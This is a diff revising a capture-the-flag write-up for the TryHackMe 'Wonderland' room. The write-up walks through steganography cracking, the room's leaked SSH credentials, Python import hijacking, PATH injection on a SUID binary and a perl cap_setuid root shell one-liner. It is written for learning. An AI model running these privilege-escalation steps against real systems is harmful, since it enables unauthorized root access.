@@ -3,33 +3,45 @@
 ## 📌 Overview
 **Room Name:** Wonderland  
 **Platform:** TryHackMe  
-**Difficulty:** Medium
+**Difficulty:** Medium  
+**Category:** Steganography / Python Library Hijacking / Privilege Escalation
 
-Wonderland is a captivating room based on "Alice in Wonderland" that tests a wide range of penetration testing skills. The progression involves steganography, directory brute-forcing, and a multi-stage privilege escalation journey—moving from Alice to Rabbit, then Hatter, and finally Root—by exploiting relative path vulnerabilities and Linux Capabilities.
+Wonderland is a multi-stage room themed around "Alice in Wonderland". It requires steganography, directory brute-forcing, and a chained privilege escalation journey — moving from Alice to Rabbit, then Hatter, and finally Root — by exploiting relative path vulnerabilities and Linux Capabilities.
+
+The attack chain involves:
+
+- stegseek to extract a hint from a JPEG image
+- Directory traversal to `/r/a/b/b/i/t/` revealing SSH credentials
+- Python library hijacking (`random.py`) for lateral movement to `rabbit`
+- PATH Injection via a SUID binary (`teaParty`) for lateral movement to `hatter`
+- Linux Capabilities (`cap_setuid` on `perl`) for root access
 
 ---
 
 ## 🔍 1. Enumeration
-### Port Scanning
-I started with an nmap scan to identify active services:
+
+### 🔎 Port Scanning
+
+```bash
+nmap -sC -sV <target_ip>
+```
 
 ```text
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
 80/tcp open  http    Apache httpd 2.4.29
 ```
 
-### Steganography & Initial Hints
-The web service on port 80 displayed a simple image. I downloaded `whiterabbit.jpeg` and checked for embedded data. Since it was a JPEG, I used `steghide` but found it required a passphrase. I then utilized `stegseek` to crack it using the `rockyou.txt` wordlist.
+### 🖼️ Steganography & Initial Hints
+The web service displayed an image. Downloaded `whiterabbit.jpeg` and cracked its steghide passphrase with `stegseek`:
 
 ```bash
 stegseek -sf whiterabbit.jpeg /usr/share/wordlists/rockyou.txt
 ```
 
-This extracted `hint.txt`, which contained the message: `follow the r a b b i t`.
+Extracted `hint.txt` containing: `follow the r a b b i t`
 
-### Directory Brute-forcing
-Taking the hint literally, I used `gobuster` to look for directories. After finding `/r/`, I manually navigated through the path `/r/a/b/b/i/t/`. On the final page, the HTML source code revealed the SSH credentials for the user Alice.
+### 🌐 Directory Brute-forcing
+Taking the hint literally, manually traversed the path `/r/a/b/b/i/t/`. The final page's HTML source revealed Alice's SSH credentials:
 
 - **Username:** `alice`
 - **Password:** `HowDothTheLittleCrocodileImproveHisShiningTail`
@@ -37,95 +49,97 @@ Taking the hint literally, I used `gobuster` to look for directories. After find
 ---
 
 ## 🔓 2. Initial Access
-Using the found credentials, I logged in via SSH:
 
 ```bash
 ssh alice@<TARGET_IP>
 ```
 
+**Initial access as `alice` achieved.** ✅
+
 ---
 
-## 🚀 3. Privilege Escalation: alice → rabbit
-### The Logic: Python Library Hijacking
-Running `sudo -l` showed that Alice could execute a Python script as the user `rabbit`:
+## 🚀 3. Lateral Movement: alice → rabbit
+
+### 🐍 Python Library Hijacking
+`sudo -l` showed Alice could run a Python script as `rabbit`:
+
 ```text
 (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-**The Vulnerability:** The script performed an `import random`. In Python, the interpreter looks for modules in the current working directory before searching the standard libraries. Since the script was located in Alice’s home directory, I had the permissions to "hijack" this import.
-
-**Exploitation:**
-1.  I created a file named `random.py` in the same directory.
-2.  I added a malicious payload to spawn a shell:
+The script performed `import random`. Python searches the current working directory before standard libraries. Since the script is in Alice's home directory (where she has write access), hijacking the import was straightforward:
 
 ```python
+# /home/alice/random.py
 import os
 os.system("/bin/bash")
 ```
-
-3.  Executing the script as `rabbit` triggered my local `random.py` instead of the system library:
 
 ```bash
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-**Result:** Successfully gained a shell as `rabbit`.
+Python loaded `/home/alice/random.py` instead of the standard library module.
+
+**Lateral movement to `rabbit` achieved.** ✅
 
 ---
 
-## 🚀 4. Privilege Escalation: rabbit → hatter
-### The Logic: PATH Hijacking
-In Rabbit's home directory, I found an SUID binary called `teaParty`. I analyzed it using `strings` and found it executed the following command:
+## 🚀 4. Lateral Movement: rabbit → hatter
+
+### 🛠️ PATH Injection via SUID Binary
+In Rabbit's home directory, found an SUID binary `teaParty`. Analyzed with `strings`:
+
 ```text
 date --date='next hour' -R
 ```
 
-**The Vulnerability:** The binary calls `date` using a relative path rather than an absolute path (like `/bin/date`). This means the system relies on the user's `PATH` environment variable to find the executable.
-
-**Exploitation:**
-1.  I created a fake `date` executable in `/tmp` that launches a shell.
+The binary calls `date` using a **relative path** — vulnerable to PATH Injection.
 
 ```bash
+# Create a fake 'date' in /tmp
 echo "/bin/bash" > /tmp/date
 chmod +x /tmp/date
-```
 
-2.  I manipulated the `PATH` variable to prioritize `/tmp`.
-
-```bash
+# Prepend /tmp to PATH
 export PATH=/tmp:$PATH
+
+# Run the SUID binary
+./teaParty
 ```
 
-3.  Running `./teaParty` forced the SUID binary to execute my malicious `/tmp/date` with elevated privileges.
+Found `password.txt` in Hatter's directory and established a stable SSH session as `hatter`.
 
-**Result:** Successfully gained a shell as `hatter`. I found `password.txt` in Hatter's directory and switched to a stable SSH session.
+**Lateral movement to `hatter` achieved.** ✅
 
 ---
 
-## 👑 5. Final Privilege Escalation: hatter → root
-### The Logic: Linux Capabilities
-After exploring Hatter's account, I found no `sudo` rights or interesting SUID files. I decided to enumerate Linux Capabilities, which are often overlooked but provide granular "superpowers" to specific binaries.
+## 👑 5. Privilege Escalation: hatter → root
 
-**Discovery:**
+### ⚡ Linux Capabilities — cap_setuid on perl
+No sudo rights and no interesting SUID files. Enumerated Linux Capabilities:
+
 ```bash
 getcap -r / 2>/dev/null
 ```
-The output showed: `/usr/bin/perl = cap_setuid+ep`.
 
-**The Vulnerability:** The `cap_setuid` capability allows the `perl` binary to manipulate its own User ID (UID). This effectively allows a user to "become" root if they can execute a script that sets the UID to 0.
+```text
+/usr/bin/perl = cap_setuid+ep
+```
 
-**Exploitation:** Using [GTFOBins](https://gtfobins.org/gtfobins/perl/), I found as a reference, I ran a Perl one-liner to set the UID to 0 (root) and spawn a shell:
+`cap_setuid` allows `perl` to set its own UID to 0 (root). Exploited with a one-liner from GTFOBins:
 
 ```bash
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
-**Result:** **ROOT ACCESS GRANTED.**
+**ROOT ACCESS GRANTED.** ✅
 
 ---
 
-## 🚩 Flags
-True to the "Alice in Wonderland" theme, the flags were placed "upside down":
+## 🏁 Flags
+
+> True to the "Alice in Wonderland" theme, flags were placed **upside down**:
 
 - **User Flag:** Located in `/root/user.txt`
 - **Root Flag:** Located in `/home/alice/root.txt`
@@ -133,6 +147,27 @@ True to the "Alice in Wonderland" theme, the flags were placed "upside down":
 ---
 
 ## 📚 Key Takeaways
-- **Relative Path Risks:** Whether it's Python imports or system commands in SUID binaries, using relative paths allows an attacker to intercept execution by placing malicious files in the search path.
-- **Enumeration Depth:** When `sudo` and SUID fail, always check for Capabilities using `getcap`. It is a common "hidden" vector for privilege escalation in modern Linux rooms.
-- **Contextual Clues:** The room's theme and hints (like "follow the rabbit") were essential for navigating the complex directory structure.
+
+- 🐍 **Python relative imports are a hijacking vector:** Scripts that `import` standard modules run from a user-writable directory can be intercepted by placing a malicious module with the same name.
+- 🛠️ **Relative paths in SUID binaries enable PATH Injection:** Whether it's Python imports or shell commands, relative paths give attackers control over what actually executes.
+- ⚡ **Linux Capabilities are a hidden PrivEsc vector:** When `sudo` and SUID fail, always check `getcap`. `cap_setuid` on an interpreter like `perl` is effectively equivalent to root.
+- 🔍 **Contextual clues matter:** The room's "follow the rabbit" theme was essential for navigating the directory structure — always read all provided hints carefully.
+
+---
+
+## 🛠️ Tools Used
+
+- `nmap`
+- `stegseek`
+- `gobuster`
+- `ssh`
+- `strings`
+- `getcap`
+- `perl`
+
+---
+
+## 📚 Credit
+✍️ Author: Akira Hasuo
+
+📘 Created for educational and portfolio purposes only
